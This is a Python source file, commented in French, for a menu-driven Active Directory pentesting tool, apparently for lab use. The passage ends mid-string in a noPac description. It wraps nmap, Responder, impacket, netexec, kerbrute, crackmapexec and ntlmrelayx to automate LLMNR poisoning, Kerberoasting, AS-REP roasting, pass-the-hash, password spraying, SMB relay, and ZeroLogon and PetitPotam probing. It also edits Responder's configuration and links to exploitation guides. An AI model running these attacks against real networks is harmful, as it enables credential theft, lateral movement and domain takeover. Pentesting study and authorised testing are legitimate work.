import ipaddress
import nmap
import subprocess
import shutil
import re


con_break=False #Variable globle utiliser pour sortir de l'outil à travers les sous-menu
class bcolors:
    '''Different couleurs pour la fonction print'''

    ROUGE = '\033[31m'
    BLEU = '\033[94m'
    VERT = '\033[92m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'
    FSOTITRE='\033[38;2;139;69;19m'


#****************************************************************************************************
#********* => 1- SCANNER LE RÉSEAU
#****************************************************************************************************

def scanning_network():

    print(f'''{bcolors.VERT}**************************************************************************************************************************************\n \
Option 1 : Scanner le réseau\n
    Cette option te permettra d'analysé le réseau 
**************************************************************************************************************************************{bcolors.ENDC}''')
    print('''Le réseau sera analysé pour obtenir les adresses IP ayant les ports suivants ouverts :\n \
    - les ports de RPC ouverts : 135, 593\n \
    - les ports de SMB ouverts : 139, 445\n \
    - les adresses IP dans le réseau\n \
    - le nom du domaine\n \
    - les contrôleurs de domaine (IP)
    ''')

    network_ip = ''

    
    #print("Quelle est la plage de réseau (sous-réseau IP) à analyser ?")
    while True:
        try:
                network_ip = input("Veuillez entrer l'adresse IP du réseau à analyser : ")
                network_ip = ipaddress.ip_address(network_ip)
                break
        except ValueError:
            print("Ceci n'est pas une adresse IP valide.")
    print("Choisissez le masque du sous-réseau.")
    subnet = get_int_val(0, 32)

    # SMB Ports
    print(f"{bcolors.VERT}\nVérification des ports ouverts pour SMB sur {network_ip}/{subnet}...{bcolors.ENDC}")
    nm = nmap.PortScanner()
    nm.scan(hosts=f"{network_ip}/{subnet}", ports="139,445", arguments="-R -Pn --open").get('scan') #spécifier les ports 139,445 du SMB
    print(nm.csv())
    # RPC Ports
    print(f"{bcolors.VERT}Vérification des ports ouverts pour RPC sur {network_ip}/{subnet}...{bcolors.ENDC}")
    nm = nmap.PortScanner()
    nm.scan(f"{network_ip}/{subnet}", arguments="-p135,593 -R -Pn --open")#spécifier les ports 135,593 du RPC 
    print(nm.csv())
    #Liste des adresses IP dans le réseau
    print(f"{bcolors.VERT}Liste de toutes les adresses IP dans la plage. {network_ip}/{subnet}...{bcolors.ENDC}")
    nm = nmap.PortScanner()
    nm.scan(f"{network_ip}/{subnet}", arguments="-sn")
    for host in nm.all_hosts():
            print(f"{host}")
    # Domain name & domain controllers
    print(f"{bcolors.VERT}Vérification du nom de domaine et des informations des contrôleurs de domaine sur {network_ip}/{subnet}...{bcolors.ENDC}")
    nm = nmap.PortScanner()
    nm.scan(f"{network_ip}/{subnet}", arguments="-p389 -sV -Pn -R")
    nmap_csv = nm.csv()
    list_dcs = [line.split(";")[0] for line in nmap_csv.splitlines() if "Microsoft Windows Active Directory LDAP" in line]
    #hostnames = [line.split(";")[2] for line in nmap_csv.splitlines() if "Microsoft Windows Active Directory LDAP" in line]
    domains_name = [line.split(";")[8].split(":")[1].split(",")[0].strip() for line in nmap_csv.splitlines() if "Microsoft Windows Active Directory LDAP" in line]

    for dc_ip in list_dcs:
        print(f"IP du contrôleur de domaine: {dc_ip}\n")

    print(f"{bcolors.WARNING}FQDN | Nom de domaine{bcolors.ENDC}")
    for domain_name in domains_name:
        print(f"{domain_name} | {domain_name.split('.')[0]} {domain_name.split('.')[-1]}")
    print(f"\n{bcolors.VERT}Retour au menu principal...{bcolors.ENDC}")



def print_menu(menu_options):
    print(f"\n{bcolors.UNDERLINE}=> Menu{bcolors.ENDC}")
    for key in menu_options.keys():
        print(f"[{key}] {menu_options[key]}")
    print("Choisissez parmi les différentes options...")
    option_numero = get_int_val(0, len(menu_options))
    return option_numero


#Fonction pour permettre à l'utilisateur de choisir des valeurs convenables
#Utilisé pour le choix des options dans les menus et le choix du masque de réseau
def get_int_val(sub_val, up_val):
    '''Récupérer un entier entre deux valeurs'''
    while True:
        try:
            val = int(input("Entrer une valeur "))
            if sub_val <= val <= up_val:
                return val
            else:
                print(f"la valeur doit être entre {sub_val} et {up_val}.")
        except ValueError:
            print(f"la valeur doit être un entier entre  {sub_val} et {up_val}.")

#****************************************************************************************************
#********* => 2-ATTAQUES CLASSIQUES
#****************************************************************************************************

def attaques_classiques():
    menu_option_2 = {
    1: "Option (1): Poisoning LLMNR/NBNS",
    2: "Option (2): Kerberoasting",
    3: "Option (3): AS-REP",
	4: "Option (4): Pass-the-hash (PtH)",
	5: "Option (5): Password spraying",
    6: "Option (6): Retourner au menu principal",
    7: "Option (7): Quitter l'outil"
                    }

    print(f'''{bcolors.VERT}**************************************************************************************************************************************\n \
Option 2 : Exploiter des attaques classiques\n
    Cette option te permettra de mener des attaques classiques sur l'Active Directory telles que 
**************************************************************************************************************************************{bcolors.ENDC}''')
    while True:
        option = print_menu(menu_option_2)
        if option == 1:
            llmnr()
        elif option == 2:
            kerberoasting()
        elif option == 3:
            as_rep()
        elif option == 4:
            pass_hash()
        elif option == 5:
            spray()
        elif option == 6:
            print("Retourner au menu principal") 
            break
        elif option ==7:
            print(f"\n{bcolors.VERT}Sortie de l'outil de Pentest de l'active directory BYEBYE{bcolors.ENDC}")            
            global con_break
            con_break=True
            break



def llmnr():
    print(f"""{bcolors.WARNING} Description de Poisoning LLMNR/NBNS: 
    Les systèmes d'exploitation Microsoft et d'autres utilisent LLMNR et NBT-NS 
pour la résolution de noms locaux en cas d'échec du DNS.
LLMNR/NBT-NS poisoning est une attaque où un acteur malveillant écoute les requêtes 
LLMNR ou NBT-NS ou d'autres et répond avec sa propre adresse IP 
(ou une autre adresse IP de son choix) pour rediriger le trafic. 
Cela peut entraîner le vol d'informations d'identification et des attaques de relais. 
Ils peuvent utiliser des outils tels que Responder pour réaliser l'empoisonnement.
    {bcolors.ENDC}""")
    #Liste des fichiers binaires de l'outil que nous voulons utiliser
    #Nous utilisons 'which' pour vérifier si un outil est disponible, et si oui, nous arrêtons la recherche.
    responder_bins=["responder", "Responder.py"]
    for bin in responder_bins:
        responder_path=shutil.which(bin)
        if responder_path is not None:
            break
    #responder_path=shutil.which('responder')
    if responder_path is not None:
        print(f"{bcolors.VERT}[+] responder trouvé {bcolors.ENDC}")
        command=f"sudo {responder_path} -I eth0 -dwv"
    # Responder utilise une interface réseau pour intercepter, manipuler, et analyser le trafic de résolution de noms sur le réseau local
        inp=input("Voulez-vous utiliser une interface autre que 'eth0'? (Y/N)")
        if inp == "y" or inp == "Y" or inp == "Yes" or inp == "yes":
            interface=input("Entrez l'interface que vous souhaitez utiliser: ")
            command=command.replace("eth0",interface)
            print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
    #Exécuter la commande avec une interface autre que eth0       
            subprocess.run(command, shell=True)
            print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

        else:
            print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
    #Exécuter la commande avec  eth0      
            subprocess.run(command, shell=True)
            print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"{bcolors.ROUGE}[-] responder non trouvé.\nInstaller avec la commande 'sudo apt install responder'{bcolors.ENDC}")

def kerberoasting():
    print(f"""{bcolors.WARNING} Description de Kerberoasting: 
    Le Kerberoasting est une méthode d'attaque visant les services d'authentification 
Kerberos au sein d'un environnement Windows Active Directory. 
Elle consiste à demander des tickets Kerberos de type Service Principal Name (SPN) 
pour des comptes de service au sein du domaine. 
Ces tickets peuvent ensuite être récupérés et analysés hors ligne, permettant ainsi 
à un attaquant de compromettre davantage le réseau.
    {bcolors.ENDC}""")
    #Liste des fichiers binaires de l'outil que nous voulons utiliser
    #Nous utilisons 'which' pour vérifier si un outil est disponible, et si oui, nous arrêtons la recherche.
    kerberoas_bins=["impacket-GetUserSPNs","GetUserSPNs.py", "GetUserSPNs"]
    for bin in kerberoas_bins:
        kerberoas_path=shutil.which(bin)
        if kerberoas_path is not None:
            break
    if kerberoas_path is not None:
        print(f"""{bcolors.VERT}[+] l'outil GetUserSPNs.py trouvé \n
{bcolors.WARNING}commande: sudo {kerberoas_path} <domaine>/<nom d'utilisateur>:<mot de passe> -dc-ip <domaine ip> -request {bcolors.ENDC}""")
        command="sudo "+kerberoas_path+" <domaine>/<nom d'utilisateur>:\"<mot de passe>\" -dc-ip <domaine ip>  -request "
    #Nous spécifions les coordonnées dont nous avons besoin pour demander un TGS.
        domaine_name=input("Entrez le nom de domaine racine (ex:seghrouchni.com): ")
        command=command.replace("<domaine>",domaine_name)

        user_name=input("Entrez le nom d'utilisateur (ex:User1 ): ")
        command=command.replace("<nom d'utilisateur>",user_name)

        password=input("Entrez le mot de passe d'utilisateur (ex:P@ssword1): ")
        command=command.replace("<mot de passe>",password)

        ip_address=input("Entrez l'adresse ip du domaine controller (ex:192.168.25.10): ")
        command=command.replace("<domaine ip>",ip_address)

        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
    #Exécuter la commande    
        subprocess.run(command, shell=True)
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"""{bcolors.ROUGE}[-] l'outil GetUserSPNs.py/impacket-GetUserSPNs non trouvé.\nInstaller avec l'une des commandes :
'sudo git clone https://github.com/fortra/impacket.git' \n'sudo apt install impacket-scripts' {bcolors.ENDC}""")


def as_rep():
    print(f"""{bcolors.WARNING} Description de AS-REP: 
    L'attaque par AS-REP Roasting tire avantage du paramétrage de certains comptes 
Active Directory qui ne requièrent pas de pré-authentification Kerberos. 
Cette dernière constitue une couche de sécurité additionnelle qui demande à l'utilisateur 
de fournir un mot de passe valide avant que le serveur Kerberos ne lui délivre un TGT (Ticket-Granting Ticket).
    {bcolors.ENDC}""")
    #Liste des fichiers binaires de l'outil que nous voulons utiliser
    #Nous utilisons 'which' pour vérifier si un outil est disponible, et si oui, nous arrêtons la recherche.
    asrep_bins=["impacket-GetNPUsers","GetNPUsers.py", "GetNPUsers"]
    for bin in asrep_bins:
        asrep_path=shutil.which(bin)
        if asrep_path is not None:
            break
    if asrep_path is not None:
        print(f"""{bcolors.VERT}[+] l'outil GetNPUsers.py trouvé \n
{bcolors.WARNING}commande: sudo  {asrep_path} <domaine>/<nom d'utilisateur> -no-pass -dc-ip <domaine ip> -request {bcolors.ENDC}""")
        command="sudo "+asrep_path+" <domaine>/<nom d'utilisateur> -no-pass -dc-ip <domaine ip> -request "
    # Nous spécifions les coordonnées dont nous avons besoin pour demander un TGT.
    # Bien sûr, nous utilisons le nom d'utilisateur qui ne requiert pas de pré-authentification.
    # Donc nous n'avons pas besoin de mot de passe, c'est pourquoi nous ajoutons 'no-pass'.
        domaine_name=input("Entrez le nom de domaine racine (ex:seghrouchni.com): ")
        command=command.replace("<domaine>",domaine_name)

        user_name=input("Entrez le nom d'utilisateur (ex:User2 ): ")
        command=command.replace("<nom d'utilisateur>",user_name)

        ip_address=input("Entrez l'adresse ip du domaine controller (ex:192.168.25.10): ")
        command=command.replace("<domaine ip>",ip_address)
        print("\n")
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
     #Exécuter la commande
        subprocess.run(command, shell=True)
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"""{bcolors.ROUGE}[-] l'outil GetNPUsers.py/impacket-GetNPUsers non trouvé.\nInstaller avec l'une des commandes :
'sudo git clone https://github.com/fortra/impacket.git' \n'sudo apt install impacket-scripts' {bcolors.ENDC}""")

def pass_hash():

    print(f"""{bcolors.WARNING} Description de Pass the hash: 
   L'attaque par "pass the hash" se produit lorsque l'attaquant obtient le hash du mot de passe d'un ou plusieurs utilisateurs. 
Au lieu de cracker ce mot de passe s'il est possible, l'attaquant peut utiliser ce hash et le nom d'utilisateur associé 
pour se déplacer latéralement à travers le réseau à l'aide du protocole d'authentification NTLM. 
Cela implique de tester les identifiants compromis contre différents systèmes pour voir si un accès non autorisé est possible. 
Dans notre cas, l'outil utilisé est 'netexec'.
    {bcolors.ENDC}""")
    #Liste des fichiers binaires de l'outil que nous voulons utiliser
    #Nous utilisons 'which' pour vérifier si un outil est disponible, et si oui, nous arrêtons la recherche.
    net_bins=["netexec", "Netexec"]
    for bin in net_bins:
        net_path=shutil.which(bin)
        if net_path is not None:
            break

    if net_path is not None:
        print(f"""{bcolors.VERT}[+] l'outil netexec trouvé \n       
{bcolors.WARNING}commande: sudo {net_path} smb <l'adresse IP du réseau > -u <nom d'utilisateur> -H <hash> --local-auth{bcolors.ENDC}""")
        command= "sudo " +net_path+" smb <l'adresse IP du réseau> -u <nom d'utilisateur> -H \"<hash>\" --local-auth "
    # Nous spécifions les coordonnées dont nous avons besoin pour effectuer un passage de hash.
    # Dans notre cas, nous transmettons le hash à toutes les machines du réseau pour vérifier si le hash convient à un compte local sur ces machines.

        ip_address=input("Entrez l'adresse IP du réseau cible (ex:192.168.25.0/24): ")
        command=command.replace("<l'adresse IP du réseau>",ip_address)

        user_name=input("Entrez le nom d'utilisateur (ex:Hamza ou Administrator): ")
        command=command.replace("<nom d'utilisateur>",user_name)

        password=input("Entrez le hash de mot de pass que vous souhaitez utiliser \n Exemples pour le test:\n # 13b29964cc2480b4ef454c59562e675c \n # f56a8399599f1be040128b1dd9623c29 : ")
        command=command.replace("<hash>",password)   

        print("\n")
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
    #Exécuter la commande
        subprocess.run(command, shell=True)
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"""{bcolors.ROUGE}[-] l'outil netexec non trouvé.\nInstaller avec les commandes suivants: :
1-sudo apt install pipx git
2-sudo pipx ensurepath
3-sudo pipx install git+https://github.com/Pennyw0rth/NetExec {bcolors.ENDC}""")


def spray():
    print(f"""{bcolors.WARNING} Description de Password Spraying: 
    Plutôt que de cibler un seul compte avec une multitude de mots de passe, 
l'attaque par "vaporisation" de mots de passe (ou "password spraying") 
consiste à envoyer un petit nombre de mots de passe courants à de nombreux comptes. 
Cette technique vise à exploiter les mots de passe faibles ou compromis qui n'ont pas été changés 
ou qui figurent dans des listes de mots de passe connus. 
    Pour cette tâche, nous utilisons l'outil 'Kerbrute' qui tente cette attaque avec le protocole Kerberos
    {bcolors.ENDC}""")
    #Liste des fichiers binaires de l'outil que nous voulons utiliser
    #Nous utilisons 'which' pour vérifier si un outil est disponible, et si oui, nous arrêtons la recherche.
    spray_bins=["kerbrute", "kerbrute_linux_amd64"]
    for bin in spray_bins:
        spray_path=shutil.which(bin)
        if spray_path is not None:
            break
    if spray_path is not None:
        print(f"""{bcolors.VERT}[+] l'outil kerbrute trouvé \n
{bcolors.WARNING}commande: sudo {spray_path} passwordspray --dc <domaine ip> -d <domaine> <Chemin vers la liste d'utilisateurs> <mot de passe> {bcolors.ENDC}""")
        command="sudo "+spray_path+" passwordspray --dc <domaine ip> -d <domaine> <Chemin vers la liste d'utilisateurs> \"<mot de passe>\" "

        ip_address=input("Entrez l'adresse ip du domaine controller (ex:192.168.25.10): ")
        command=command.replace("<domaine ip>",ip_address)

        domaine_name=input("Entrez le nom de domaine racine (ex:seghrouchni.com): ")
        command=command.replace("<domaine>",domaine_name)

        file_path=input("Entrez le chemin vers la liste d'utilisateurs(ex:/root/usernames.txt): ")
        command=command.replace("<Chemin vers la liste d'utilisateurs>",file_path)

        password=input("Entrez le mot de passe que vous souhaitez tester(ex:P@ssword): ")
        password=password.replace("$","\$")
        command=command.replace("<mot de passe>",password)        
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
    #Exécuter la commande
        subprocess.run(command, shell=True)
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"""{bcolors.ROUGE}[-] l'outil kerbrute non trouvé.\nInstaller avec les commandes suivants:
1-'wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64' \n2-'chmod 755 kerbrute_linux_amd64'
 3-'sudo cp kerbrute_linux_amd64 /usr/local/bin/kerbrute' {bcolors.ENDC}""")

#****************************************************************************************************
#********* => 3-Recherche et Exploiter de vulnérabilités connues
#****************************************************************************************************
def rech_exp_vuln():
    menu_option_6 = {
    1: "Option (1): Rechercher ou Exploiter 'SMB SIGNING'",
    2: "Option (2): Rechercher 'MS17-010 (EternalBlue)' ",
    3: "Option (3): Rechercher 'CVE-2020-1472 (ZeroLogon)' ",
	4: "Option (4): Rechercher 'PetitPotam (CVE-2021-36942)'",
	5: "Option (5): Rechercher 'noPac (CVE-2021-42278 et CVE-2021-42287)'",
    6: "Option (6): Retourner au menu principal",
    7: "Option (7): Quitter l'outil"
                    }

    print(f'''{bcolors.VERT}**************************************************************************************************************************************\n \
Option 3 : Recherche et Exploiter de vulnérabilités connues
    Cette option permet de chercher des vulnérabilités connues dans notre environnement 
    si l'existe il l'offre l'option de l'exploiter c'est vulnérabilités.
**************************************************************************************************************************************{bcolors.ENDC}''')
    while True:
        option = print_menu(menu_option_6)
        if option == 1:
            smb_signing()
        elif option == 2:
            eternal_blue()
        elif option == 3:
            zerologon()
        elif option == 4:
            petit_potam()
        elif option == 5:
            no_PAC()
        elif option == 6:
            print("Retourner au menu principal") 
            break
        elif option ==7:
            print(f"\n{bcolors.VERT}Sortie de l'outil de Pentest de l'active directory BYEBYE{bcolors.ENDC}")            
            global con_break
            con_break=True
            break




def smb_signing():
    print(f"""{bcolors.WARNING}{bcolors.UNDERLINE}Description de la vulnérabilité de SMB Signing : {bcolors.ENDC}
    La signature SMB (également appelée signatures de sécurité) est un mécanisme de sécurité dans le protocole SMB. 
La signature SMB signifie que chaque message SMB contient une signature générée en utilisant la clé de session. Cela prouve l'authenticité de l'expéditeur.
    {bcolors.WARNING}{bcolors.UNDERLINE} Cible(s) : {bcolors.ENDC}
        o Ordinateurs avec SMB Signing = False
    {bcolors.WARNING}{bcolors.UNDERLINE} Étapes d'exploitation : {bcolors.ENDC}
        o Demander une adresse IP et vérifier son statut SMB Signing (dans notre cas, nous vérifierons le réseau).
        o Utiliser Responder pour capturer le NTLM d'un certain utilisateur.
        o Utiliser ntlmrelayx pour relayer le NTLM vers une certaine ordinateur afin de gagner un accès et d'extraire 
          d'éventuelles informations d'identification. Il est possible d'obtenir un shell interactif, mais dans notre cas, nous ne le ferons pas.
    {bcolors.WARNING}{bcolors.UNDERLINE} Mesures d'atténuation :{bcolors.ENDC}
        o Configurer SMB Signing sur True.
    {bcolors.ENDC}""")
    #le fichier binaire de l'outil que nous voulons utiliser
    crackmap_path=shutil.which("crackmapexec")
    if crackmap_path is None:
        print(f"""{bcolors.ROUGE}[-] l'outil crackmapexec non trouvé.\nInstaller avec la commande :
'sudo apt install crackmapexec' {bcolors.ENDC}""")
        return ""
        
    ip_address=input("Entrez l'adresse IP du réseau cible (ex:192.168.25.0/24): ")
    print("Rechercher la vulnérabilité .........")
    #Utiliser CrackMapExec pour découvrir les machines sur lesquelles SMB Signing est désactivé.
    output=subprocess.Popen(["sudo",crackmap_path,"smb",ip_address], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)

    outputt,erreur=output.communicate() #Attendre que la commande se termine et récupérer sa sortie.

    #Expression régulière pour extraire toutes les machines où SMB signing est désactivé : signing:False
    ip_addresses = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b(?=.*signing:False)", outputt)

    print(f"{bcolors.VERT}Les adresses IP pour lesquelles SMB Signing est désactivé.{bcolors.ENDC}")
    # Affichage des adresses IP extraites
    for ip in ip_addresses:
        print(ip)

    if ip_addresses is not None:
        inp=input("Voulez-vous exploiter cette vulnérabilité ? (Y/N)")
        if inp == "y" or inp == "Y" or inp == "Yes" or inp == "yes":
            #subprocess.run(command, shell=True)

            responder_bins=["responder", "Responder.py"]
            for bin in responder_bins:
              responder_path=shutil.which(bin)
              if responder_path is not None:
                    break
            if responder_path is None:
                print(f"{bcolors.ROUGE}[-] responder non trouvé.\nInstaller avec la commande 'sudo apt install responder'{bcolors.ENDC}")
                return ""


            responder_conf(True)
            print(f"{bcolors.VERT}[+] Fichier de configuration de Responder modifié. \n {bcolors.ENDC}")

            interface="eth0"
            inp=input("Voulez-vous utiliser une interface autre que 'eth0'? (Y/N)")
            if inp == "y" or inp == "Y" or inp == "Yes" or inp == "yes":
                interface=input("Entrez l'interface que vous souhaitez utiliser: ")

            
            responder_cmd = "sudo "+responder_path+" -I eth0 -dwv"
            responder_cmd=responder_cmd.replace("eth0",interface)
            # Démarrer le processus Responder en arrière-plan
            process = subprocess.Popen(responder_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,cwd=".")
            print(f"{bcolors.VERT}[+] Responder a été démarré en arrière-plan. \n {bcolors.ENDC}")

            ntlmrelay_bins=["ntlmrelayx.py","impacket-ntlmrelayx"]
            for bin in ntlmrelay_bins:
              ntlmrelay_path=shutil.which(bin)
              if ntlmrelay_path is not None:
                    break
              
            if ntlmrelay_path is None:
                return ""
            
            command="sudo "+ ntlmrelay_path+" -t <machine cible ip> -smb2support"
            ip_address=input("Entrez l'adresse ip du machine cible (ex:192.168.25.20): ")
            command=command.replace("<machine cible ip>",ip_address)
            print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
        #Exécuter la commande
            subprocess.run(command, shell=True)

            print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
            responder_conf(False)
            print(f"\n{bcolors.VERT}[+] Fichier de configuration de Responder rétabli. \n {bcolors.ENDC}")

        else:
            print("Aucun addresse vulnérable")


# Fonction pour modifier le fichier de configuration de Responder et le restaurer à son état initial après utilisation
def responder_conf(OF):
    # Chemin du fichier de configuration
    config_file_path = "/etc/responder/Responder.conf"

    # Ouvrir le fichier en mode lecture/écriture
    with open(config_file_path, "r+") as file:
        # Lire toutes les lignes du fichier
        lines = file.readlines()

        # Parcourir les lignes pour trouver celles contenant les options SMB et HTTPS
        for i, line in enumerate(lines):
            if "SMB" in line:
                if(OF==True):
                    lines[i] = line.replace("On", "Off")
                else:
                    lines[i] = line.replace("Off", "On")
            elif "HTTP" in line:
                if(OF==True):
                    lines[i] = line.replace("On", "Off")
                else:
                    lines[i] = line.replace("Off", "On")

        # Retourner au début du fichier
        file.seek(0)

        # Écrire les lignes modifiées dans le fichier
        file.writelines(lines)

        # Tronquer le fichier pour supprimer le contenu excédentaire
        file.truncate()

    # Fermer le fichier
    file.close()


def eternal_blue():
    print(f"""{bcolors.WARNING}{bcolors.UNDERLINE}Description de la vulnérabilité EternalBlue : {bcolors.ENDC}
          EternalBlue est une vulnérabilité dans le protocole SMB de Microsoft Windows. 
Elle permet à des attaquants d'exécuter du code à distance sur un système vulnérable.
Pour exploiter cette vulnérabilité, l'attaquant doit envoyer des paquets malveillants 
au service SMB sur le port 445.
          {bcolors.WARNING}{bcolors.UNDERLINE} Cible(s) : {bcolors.ENDC}
        o Systemes: Windows XP - Windows 7 - Windows 8.1 - Windows Server2008/2012/2016 etc
          """)
    # Créer un objet scanner Nmap
    nm = nmap.PortScanner()
    # Adresse réseau à scanner
    network = input("Entrez l'adresse réseau à scanner (ex: 192.168.25.0/24): ")
    # Scanner le réseau à la recherche de la vulnérabilité EternalBlue
    nm.scan(hosts=network, arguments='-p445 --script smb-vuln-ms17-010')
    # Initialiser une liste pour stocker les adresses IP vulnérables
    vulnerable_hosts = []
    # Parcourir les résultats du scan
    for host in nm.all_hosts():
        # Vérifier si l'hôte est vulnérable à EternalBlue
        if 'smb-vuln-ms17-010' in nm[host]['tcp'][445]:
            vulnerable_hosts.append(host)

    # Afficher les adresses IP vulnérables
    if vulnerable_hosts:
        print("Les adresses IP suivantes sont vulnérables à EternalBlue:")
        for host in vulnerable_hosts:
            print(host)
        print("Vous pouvez exploiter cette vulnérabilité à l'aide du lien suivant : \n https://ethicalhackingguru.com/how-to-exploit-ms17-010-eternal-blue-without-metasploit/")
    else:
        print(f"{bcolors.BLEU}Aucune adresse IP vulnérable à EternalBlue n'a été trouvée sur le réseau.{bcolors.ENDC}")


def zerologon():
    print(f"""{bcolors.WARNING}Description de la vulnérabilité Zerologon : 
            Zerologon, également connue sous le nom de CVE-2020-1472, est une faille de sécurité critique affectant 
le protocole Netlogon utilisé par les contrôleurs de domaine (DC) dans les environnements Microsoft Active Directory. 
Cette vulnérabilité permet à un attaquant non authentifié de prendre le contrôle complet d'un DC, ce qui peut avoir des conséquences désastreuses pour un réseau.
          {bcolors.ENDC}""")
    #Liste des fichiers binaires de l'outil que nous voulons utiliser
    #Nous utilisons 'which' pour vérifier si un outil est disponible, et si oui, nous arrêtons la recherche.
    net_bins=["netexec", "Netexec"]
    for bin in net_bins:
        net_path=shutil.which(bin)
        if net_path is not None:
            break

    if net_path is not None:
        print(f"""{bcolors.VERT}[+] l'outil netexec trouvé \n {bcolors.ENDC}""")
        command= "sudo " +net_path+" smb <l'adresse IP du controleur de domaine> -u \"\" -p \"\" -M zerologon"

        ip_address=input("Entrez l'adresse IP du controleur de domaine  (ex:192.168.25.10): ")
        command=command.replace("<l'adresse IP du controleur de domaine>",ip_address)  
        print("Rechercher la vulnérabilité .........")

        # Démarrer le processus netexec/crackmapexec en arrière-plan
        #Attendre que la commande se termine et récupérer sa sortie.
        output=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
        outputt,erreur=output.communicate()
        lines = outputt.split('\n')
        


        print("\n")
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
        for line in lines:
         if 'ZEROLOGON' in line:
            if 'Attack failed' in line:
                print("La cible est probablement patchée à cette vulnérabilité")
            else:
                print("la cible est vulnérable à ZeroLogon")
        print(f"{bcolors.VERT}\n**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"""{bcolors.ROUGE}[-] l'outil netexec non trouvé.\nInstaller avec les commandes suivants: :
1-sudo apt install pipx git
2-sudo pipx ensurepath
3-sudo pipx install git+https://github.com/Pennyw0rth/NetExec {bcolors.ENDC}""")

def petit_potam():
    print(f"""{bcolors.WARNING}Description de la vulnérabilité de PetitPotam : 
    La vulnérabilité PetitPotam est une technique d'attaque qui exploite une faiblesse dans le protocole NTLM utilisé par Microsoft Windows pour l'authentification. 
Elle permet à un attaquant de forcer un contrôleur de domaine Windows à authentifier un utilisateur via NTLM, 
puis à utiliser cette authentification pour exécuter des commandes arbitraires, souvent dans le but de compromettre le système. 
Cette technique peut être utilisée pour des attaques de type relais et peut potentiellement entraîner une prise de contrôle complète du domaine par un attaquant malveillant.
{bcolors.ENDC}
""")
    #le fichier binaire de l'outil que nous voulons utiliser
    crackmap_path=shutil.which("crackmapexec")
    if crackmap_path is None:
        print(f"""{bcolors.ROUGE}[-] l'outil crackmapexec non trouvé.\nInstaller avec la commande :
'sudo apt install crackmapexec' {bcolors.ENDC}""")
        return ""
    print(f"""{bcolors.VERT}[+] l'outil crackmapexec trouvé \n {bcolors.ENDC}""")
    command= "sudo " +crackmap_path+" smb <l'adresse IP du controleur de domaine> -u \"<nom d'utilisateur>\" -p \"<mot de passe>\" -M petitpotam"

    ip_address=input("Entrez l'adresse IP du controleur de domaine  (ex:192.168.25.10): ")
    command=command.replace("<l'adresse IP du controleur de domaine>",ip_address)  
        
    user_name=input("Entrez le nom d'utilisateur d'un compte dans le domaine (ex:User1 ou User2 ou Administrator): ")
    command=command.replace("<nom d'utilisateur>",user_name)

    password=input("Entrez le mot de passe de ce compte (ex:P@ssword1): ")
    command=command.replace("<mot de passe>",password) 
    print("Rechercher la vulnérabilité .........")

    # Démarrer le processus crackmapexec en arrière-plan
    #Attendre que la commande se termine et récupérer sa sortie.
    output=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    outputt,erreur=output.communicate()

    #Divisez la sortie en lignes
    lines = outputt.split('\n')
    print("\n")
    print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
    for line in lines:
            if 'VULNERABLE' in line:
                print(f"""{bcolors.WARNING} le controleur de domaine est vulnérable à Petitpotam\n
Vous pouvez exploiter cette vulnérabilité à l'aide du lien suivant : \n 
https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory {bcolors.ENDC}""")
                break
    if len(lines)<4:
        print(f"{bcolors.WARNING}La cible est probablement patchée à cette vulnérabilité{bcolors.ENDC}")
    print(f"{bcolors.VERT}\n**************************************************************************************************************************************\n {bcolors.ENDC}")



def no_PAC():
    print(f"""{bcolors.WARNING}Description de la vulnérabilité noPac (CVE-2021-42278 et CVE-2021-42287)  : 
    La vulnérabilité noPac (CVE-2021-42278 et CVE-2021-42287) sont deux failles de sécurité qui ont été découvertes en décembre 2021 
et qui peuvent entraîner une élévation de privilèges sur les systèmes Windows. 
CVE-2021-42287 : Il s'agit d'une vulnérabilité d'élévation de privilèges associée au Kerberos Privilege Attribute Certificate (PAC) 
          dans les Services de domaine Active Directory (AD DS).Le PAC est utilisé pour stocker des informations d'autorisation dans les tickets Kerberos.
CVE-2021-42278 : Il s'agit d'une vulnérabilité de contournement de sécurité SAM (Security Account Manager).
          Étapes d'exploitation : 
    o Créer un nouveau compte d'ordinateur dans Active Directory (AD) avec un nom aléatoire, puis le renommer en utilisant le nom d'un contrôleur de domaine (sans le suffixe $).
    o Demander un ticket-granting ticket (TGT) pour le compte d'ordinateur créé à l'étape précédente.
    o Une fois le TGT obtenu, restaurer le nom d'origine du compte d'ordinateur.
    o Demander un ticket granting service (TGS) pour le service Lightweight Directory Access Protocol (LDAP) en utilisant le TGT précédent 
          et le nom du contrôleur de domaine usurpé. Le TGS choisit le nom le plus proche et ajoute un $.
    o L'accès au service est accordé, et l'attaquant obtient des privilèges d'administrateur de domaine.
